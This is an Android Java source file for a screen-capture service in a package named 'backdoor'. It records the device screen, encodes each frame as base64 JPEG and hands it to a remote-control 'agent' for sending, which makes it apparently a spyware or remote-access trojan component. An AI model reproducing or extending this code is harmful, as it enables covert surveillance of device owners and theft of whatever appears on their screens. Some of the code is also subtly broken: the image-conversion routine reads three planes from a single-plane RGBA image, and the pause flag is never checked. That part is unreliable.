package com.lazyframework.backdoor;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import androidx.annotation.RequiresApi;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.concurrent.atomic.AtomicBoolean;

@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public class ScreenMirrorHelper extends Service {
    private static final String TAG = "ScreenMirror";
    private static final int QUALITY = 60;  // JPEG quality (0-100)
    private static final int DENSITY_DPI = 120;  // Lower for smaller file size
    
    // ==================== SCREEN CAPTURE ====================
    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler handler;
    private AtomicBoolean isCapturing = new AtomicBoolean(false);
    private AtomicBoolean isPaused = new AtomicBoolean(false);
    
    // ==================== AGENT SERVICE ====================
    private static AgentService agentService;
    
    // ==================== SCREEN INFO ====================
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;
    
    // ==================== PERFORMANCE ====================
    private long lastCaptureTime = 0;
    private static final long MIN_CAPTURE_INTERVAL = 500;  // Min 500ms between captures
    private static final int MAX_FRAME_SIZE = 1000000;  // 1MB max per frame

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🎬 ScreenMirrorHelper created");
        
        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        handler = new Handler(Looper.getMainLooper());
        
        getScreenDimensions();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "🎬 ScreenMirrorHelper destroyed");
        stopScreenCapture();
    }

    // ==================== SCREEN DIMENSIONS ====================

    private void getScreenDimensions() {
        try {
            WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            windowManager.getDefaultDisplay().getMetrics(metrics);
            
            screenWidth = metrics.widthPixels;
            screenHeight = metrics.heightPixels;
            screenDensity = metrics.densityDpi;
            
            Log.d(TAG, "📐 Screen: " + screenWidth + "x" + screenHeight + " @ " + screenDensity + "dpi");
        } catch (Exception e) {
            Log.e(TAG, "Error getting screen dimensions: " + e.getMessage());
            screenWidth = 1080;
            screenHeight = 1920;
            screenDensity = 420;
        }
    }

    // ==================== START SCREEN CAPTURE ====================

    public synchronized void startScreenCapture(MediaProjection projection) {
        try {
            if (isCapturing.get()) {
                Log.w(TAG, "⚠️ Capture already running");
                return;
            }
            
            mediaProjection = projection;
            
            // Create ImageReader untuk capture frames
            imageReader = ImageReader.newInstance(
                screenWidth, 
                screenHeight, 
                PixelFormat.RGBA_8888, 
                2  // 2 buffers
            );
            
            // Create virtual display
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "ScreenCapture",
                screenWidth,
                screenHeight,
                screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null,
                handler
            );
            
            // Set image listener
            imageReader.setOnImageAvailableListener(
                image -> {
                    if (image != null) {
                        captureFrame(image);
                        image.close();
                    }
                },
                handler
            );
            
            isCapturing.set(true);
            isPaused.set(false);
            Log.d(TAG, "✅ Screen capture started");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Start capture error: " + e.getMessage());
            isCapturing.set(false);
        }
    }

    // ==================== STOP SCREEN CAPTURE ====================

    public synchronized void stopScreenCapture() {
        try {
            isCapturing.set(false);
            
            if (virtualDisplay != null) {
                virtualDisplay.release();
                virtualDisplay = null;
            }
            
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            
            if (mediaProjection != null) {
                mediaProjection.stop();
                mediaProjection = null;
            }
            
            Log.d(TAG, "⏹️ Screen capture stopped");
        } catch (Exception e) {
            Log.e(TAG, "Stop capture error: " + e.getMessage());
        }
    }

    // ==================== CAPTURE SINGLE FRAME ====================

    private void captureFrame(Image image) {
        try {
            // Rate limiting
            long currentTime = System.currentTimeMillis();
            if (currentTime - lastCaptureTime < MIN_CAPTURE_INTERVAL) {
                return;
            }
            lastCaptureTime = currentTime;
            
            // Convert image to Bitmap
            Bitmap bitmap = imageToBitmap(image);
            if (bitmap == null) {
                Log.e(TAG, "❌ Failed to convert image to bitmap");
                return;
            }
            
            // Compress ke JPEG
            byte[] jpegData = bitmapToJpeg(bitmap, QUALITY);
            if (jpegData == null) {
                Log.e(TAG, "❌ Failed to compress bitmap");
                bitmap.recycle();
                return;
            }
            
            // Check size
            if (jpegData.length > MAX_FRAME_SIZE) {
                Log.w(TAG, "⚠️ Frame too large: " + jpegData.length + " bytes, reducing quality");
                jpegData = bitmapToJpeg(bitmap, QUALITY - 10);
            }
            
            // Encode to base64
            String frameData = Base64.encodeToString(jpegData, Base64.NO_WRAP);
            
            // Send to agent
            if (agentService != null) {
                try {
                    JSONObject frameJson = new JSONObject();
                    frameJson.put("type", "screen_frame");
                    frameJson.put("width", screenWidth);
                    frameJson.put("height", screenHeight);
                    frameJson.put("size", jpegData.length);
                    frameJson.put("data", frameData);
                    frameJson.put("timestamp", System.currentTimeMillis());
                    
                    agentService.sendScreenFrame(frameJson.toString());
                } catch (JSONException e) {
                    Log.e(TAG, "JSON error: " + e.getMessage());
                }
            }
            
            bitmap.recycle();
            
            Log.d(TAG, "📸 Frame captured: " + jpegData.length + " bytes");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Capture frame error: " + e.getMessage());
        }
    }

    // ==================== IMAGE TO BITMAP ====================

    private Bitmap imageToBitmap(Image image) {
        try {
            int width = image.getWidth();
            int height = image.getHeight();
            Image.Plane[] planes = image.getPlanes();
            int pixelStride = planes[0].getPixelStride();
            
            int[] pixels = new int[width * height];
            int offset = 0;
            
            for (int y = 0; y < height; y++) {
                for (int x = 0; x < width; x++) {
                    int pixel = 0;
                    for (int plane = 0; plane < 3; plane++) {
                        Image.Plane p = planes[plane];
                        int bytesPerPixel = p.getPixelStride();
                        byte value = p.getBuffer().get(y * p.getRowPadding() + x * bytesPerPixel);
                        if (plane == 0) {
                            pixel |= (value & 0xFF) << 16;  // R
                        } else if (plane == 1) {
                            pixel |= (value & 0xFF) << 8;   // G
                        } else if (plane == 2) {
                            pixel |= (value & 0xFF);        // B
                        }
                    }
                    pixels[offset++] = pixel | 0xFF000000;  // Alpha
                }
            }
            
            return Bitmap.createBitmap(pixels, width, height, Bitmap.Config.ARGB_8888);
        } catch (Exception e) {
            Log.e(TAG, "Image to bitmap error: " + e.getMessage());
            return null;
        }
    }

    // ==================== BITMAP TO JPEG ====================

    private byte[] bitmapToJpeg(Bitmap bitmap, int quality) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
            return baos.toByteArray();
        } catch (Exception e) {
            Log.e(TAG, "Bitmap to JPEG error: " + e.getMessage());
            return null;
        }
    }

    // ==================== PAUSE/RESUME ====================

    public void pauseCapture() {
        isPaused.set(true);
        Log.d(TAG, "⏸️ Capture paused");
    }

    public void resumeCapture() {
        isPaused.set(false);
        Log.d(TAG, "▶️ Capture resumed");
    }

    public boolean isCapturing() {
        return isCapturing.get() && !isPaused.get();
    }

    // ==================== GET SCREEN INFO ====================

    public JSONObject getScreenInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("width", screenWidth);
            info.put("height", screenHeight);
            info.put("density", screenDensity);
            info.put("aspect_ratio", String.format("%.2f", (float) screenWidth / screenHeight));
            info.put("is_capturing", isCapturing.get());
            info.put("is_paused", isPaused.get());
            return info;
        } catch (JSONException e) {
            return new JSONObject();
        }
    }

    // ==================== AGENT SERVICE INTERFACE ====================

    public static void setAgentService(AgentService service) {
        agentService = service;
        Log.d(TAG, "📡 Agent service connected");
    }
}
